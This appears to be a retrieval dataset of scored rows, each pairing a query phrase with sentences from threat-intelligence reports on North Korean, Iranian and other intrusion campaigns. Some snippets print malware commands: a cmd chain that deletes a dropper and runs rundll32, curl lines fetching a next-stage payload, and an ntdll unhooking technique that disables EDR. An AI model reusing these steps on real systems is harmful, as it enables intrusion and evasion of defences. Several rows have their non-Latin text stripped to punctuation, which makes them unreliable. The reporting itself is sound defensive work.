the malware can disable the functionalities of EDR/AV products.|0.9018412323124602|['Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.', 'If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands: Windows Defender: cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1 Bitdefender: cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1 The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.']
the malware can disable the functionalities of EDR/AV products.|0.9018412323124602|"[']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3DStructure of configurationIn the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.Infection flow of downloaderThis downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classicunhooking DLL trickintended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03fNext, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands:Windows Defender:cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1Bitdefender:cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.Avira or Avast installed:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddaOther cases:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddlNote that the user-agent name is cur1-agent, and the malware sends da POST data if the victim installed Avira or Avast; otherwise, the malware sends dl POST data.', 'If the fetched data by cURL command contains <html> and curl:, the malware decrypts the payload with a delivered 64-byte RC4 key.If Avira or Avast are installed, the malware saves the decrypted payload to %TEMPLATES%\\\\marcoor.dll and spawns it with the rundll32.exe command with the payload URL.command:exe %TEMPLATES%\\\\marcoor.dll #1 [payload URL]Otherwise, the malware doesnt write the payload to the file and injects the fetched payload into the explorer.exe process.', 'The fetched payload is a DLL type executable and its export function is spawned with the payload URL.Unfortunately, we havent been able to obtain a precise infection chain so far.']"
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address|1.0|[']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.', 'If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands: Windows Defender: cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1 Bitdefender: cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1 The primary objective of this malware is to fetch the next stage payload.']
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address|1.0|"['The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33Restored URL: hxxps://docs.azure-protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3DStructure of configurationIn the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.Infection flow of downloaderThis downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classicunhooking DLL trickintended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03fNext, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands:Windows Defender:cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1Bitdefender:cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.Avira or Avast installed:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddaOther cases:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddlNote that the user-agent name is cur1-agent, and the malware sends da POST data if the victim installed Avira or Avast; otherwise, the malware sends dl POST data.', 'If the fetched data by cURL command contains <html> and curl:, the malware decrypts the payload with a delivered 64-byte RC4 key.If Avira or Avast are installed, the malware saves the decrypted payload to %TEMPLATES%\\\\marcoor.dll and spawns it with the rundll32.exe command with the payload URL.command:exe %TEMPLATES%\\\\marcoor.dll #1 [payload URL]Otherwise, the malware doesnt write the payload to the file and injects the fetched payload into the explorer.exe process.']"
download of a batch (.bat) file.|0.8846667855663113|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
After the strings are decrypted|0.8956197311458653|['ESET Research White Paper // January 2021 TLP: WHITE A WILD KOBALOS APPEARS Tricksy Linux malware goes after HPCs Marc-Etienne M.Lveill Ignacio SanmillanTABLE OF CONTENTS 1.', 'Executive summary .', '.', '.', '.', '.', '.', '.']
may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware.|0.9396873868217263|['A hallmark of the activity we discuss in this post is Kimsukys focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities.', 'As part of their initial contact strategy, the group impersonated Chad OCarroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.', ']pro, which closely resembles the legitimate NK News domain nknews.org.', 'The initial email requests the review of a draft article analyzing the nuclear threat posed by North Korea.', 'If the target engages in the conversation, Kimsuky uses the opportunity to deliver a spoofed URL to a Google document, which redirects to a malicious website specifically crafted to capture Google credentials.', 'Kimsuky may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware.', '1/6Further, Kimsukys objective extends to the theft of subscription credentials from NK News.', 'To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.', ']pro, which masquerades as the authentic NK News site.', 'The login form that is presented to the target is designed to capture entered credentials.', 'This Kimsuky activity indicates the groups growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations, including the delivery of malware.']
hardware information.|0.8790678887129278|['At the joint level, the CCMD must provide the identification, technical description, and analysis of threat change validation messages expeditiously to component commands and Service reprogramming centers [Army Reprogramming Analysis Team for the Army].', 'F-2 FM 3-12 24 August 2021Electromagnetic Warfare Reprogramming Determine the Response F-8.', 'Service reprogramming centers assess validated threat change information for its impact on friendly EW and TSS equipment.', 'A decision to initiate a reprogramming change is determined.', 'The equipment may fail to provide appropriate indications and warnings or countermeasures in response to a threat change.', 'In this instance, the Service reprogramming center determines if the requirement to correct the deficiency is either by changing tactics, software, or hardware.', 'F-9.', 'Service equipment support generates a system impact message that informs CCMDs and component commands of the threat changes operational impact on EW and TSS equipment performance.', 'The CCMDs forward the system impact message through the JTF headquarters to subordinate units.', 'The system impact message often includes recommendations to respond to each identified threat change appropriately; however, each unit is ultimately responsible for determining the appropriate response action to a validated threat change.', 'Create the Change F-10.']
to use this tool for remote management of its infrastructure.|0.7879164038097942|['4/6JavaScript code The main website hosted at https[://]www.nknews[.', ']pro redirects to the legitimate NK News site, https://nknews.org, and uses a certificate issued by Sectigo: Thumbprint: a1597d197e9b084a043ada5c7dac1f9b6d7f7af3 Serial number: 00f342582c9a299acf2452aaf5115c5be0 The domain nknews[.', ']pro, registered through Namecheap, also resolves to the Kimsuky-linked IP address 162.0.209[.]27.', 'The URL https[://]www.nknews[.]pro/config[.', ']php hosts a password-protected remote management site, which is likely an implementation of the b374k tool, based on the implementation of the login site and the presence of the config.php file.', 'The Kimsuky group is known to use this tool for remote management of its infrastructure.', 'b374k login site Conclusion SentinelLabs remains actively engaged in monitoring the activities conducted by Kimsuky.', 'The findings presented in this post highlight the groups persistent commitment to targeted social engineering attacks and underscore the need for increased awareness and understanding of Kimsukys tactics among potential targets.', 'Maintaining vigilance and implementing effective security measures are imperative to mitigate the risks posed by this persistent threat actor.', 'Indicators of Compromise Indicator Description nknews[.', ']pro Phishing email sender domain chad.ocarroll@nknews[.']
the attacker downloads files,|0.8042909175509549|['Standalone EXE.', 'Presumed to be an earlier version before 2014 2015.04 CRYPTBASE.dll Assumed to have been created in December 2014.', 'Independent DLL.', 'Collect system information and file information within the USB flash drive.', '2015.06 BrWeb.dll, wsmt.exe Loads BrWeb.dll by patching a Brother Printer-related file.', 'Downloads files.', 'ALYAC25.exe patch function.', 'Scans *.hwp files.', 'Infects EXE files.', 'Additional malware is found.', '2015.06 CRYPTBASE.dll, svcmgr.exe Bnb Solution comparison functions were added.']
“cmd” /c|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
“cmd” /c|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
“cmd” /c|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
“cmd” /c|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
“cmd” /c|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"""cmd"" /c"|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"""cmd"" /c"|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"""cmd"" /c"|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"""cmd"" /c"|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"""cmd"" /c"|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
gains access to the targets through remote exploitation of an unpatched internet-facing device.|0.8230335171199984|['MERCURY has also been observed using Rport and a similar version of Ligolo in previous attacks.', 'DEV-1084 used the vatacloud[.', ']com domain for command and control (C2) during this incident.', 'Microsoft assesses with high-confidence that the vatacloud[.', ']com domain is controlled by MERCURY operators.', 'Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet- facing device.', 'MERCURY then handed off access to DEV-1084.', 'It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an effects based sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack.', 'Early activities, related attacker tools and techniques Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 2022.', 'After gaining access, the threat actors deploy several tools and leverage techniques to maintain persistence, which provide effective and continued access to compromised devices, such as the following: Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus 1/10Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.', 'Such reconnaissance activities were seen leveraged throughout the attack chain.']
to register a scheduled task used to launch the ransomware payload.|0.7513969785795929|['Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.', 'For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such as Ligolo and OpenSSH, commonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tools using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.', 'Figure 1.', 'On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.', 'Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.']
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.|1.0000000000000002|['MERCURY then handed off access to DEV-1084.', 'It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an effects based sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack.', 'Early activities, related attacker tools and techniques Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 2022.', 'After gaining access, the threat actors deploy several tools and leverage techniques to maintain persistence, which provide effective and continued access to compromised devices, such as the following: Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus 1/10Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.', 'Such reconnaissance activities were seen leveraged throughout the attack chain.', 'The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.', 'These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.', 'Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.', 'For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such as Ligolo and OpenSSH, commonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tools using Group Policy Objects (GPO).']
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.|0.8073648957266579|[']comdomain for command and control (C2) during this incident.', 'Microsoft assesses with high-confidence that thevatacloud[.', ']comdomain is controlled by MERCURY operators.Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device.', 'MERCURY then handed off access to DEV-1084.', 'It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an effects based sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack.Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example,continuing to exploit Log4j 2 vulnerabilities in unpatched systemsin July 2022.After gaining access, the threat actors deploy several tools and leverage techniques to maintain persistence, which provide effective and continued access to compromised devices, such as the following:Installing web shellsAdding a local user account and elevating privileges to local administratorInstalling legitimate remote access tools, such asRPort, Ligolo andeHorusInstalling a customized PowerShell script backdoorStealing credentialsOnce the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such asnetstatandnltest.', 'Such reconnaissance activities were seen leveraged throughout the attack chain.The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.', 'These actions mainly involved:Remote scheduled tasks to launch their customized PowerShell backdoorWindows Management Instrumentation (WMI) to launch commands on devicesRemote services to run encoded PowerShell commandsAfter infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.', 'Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such asLigoloandOpenSSH, commonly leveraged to stay under the radar of security teams and solutions.On-premises destructive impactIn observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices.To do so, they first interfered with security tools using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension toDARKBITand dropped ransom notes.Figure 1.', 'On-premises attack flowMoving from on-premises to cloudTo move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.']
GPO was leveraged again to register a scheduled task used to launch the ransomware payload.|1.0000000000000002|['Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.', 'For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such as Ligolo and OpenSSH, commonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tools using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.', 'Figure 1.', 'On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.', 'Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.']
first interfered with security tools using Group Policy Objects (GPO).|0.9157796284094262|['The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.', 'These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.', 'Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.', 'For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such as Ligolo and OpenSSH, commonly leveraged to stay under the radar of security teams and solutions.', 'On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on- premises destructive operations to prepare for large-scale encryption of targeted devices.', 'To do so, they first interfered with security tools using Group Policy Objects (GPO).', 'With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.', 'Figure 1.', 'On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.']
the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.|0.9007177478704744|['With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.', 'GPO was leveraged again to register a scheduled task used to launch the ransomware payload.', 'Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.', 'Figure 1.', 'On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.', 'Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.', 'The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.', 'Azure AD Connect is an on-premises application for managing hybrid identities through features like password hash synchronization, pass-through authentication, objects synchronization, and others.', 'As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and 2/10cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.']
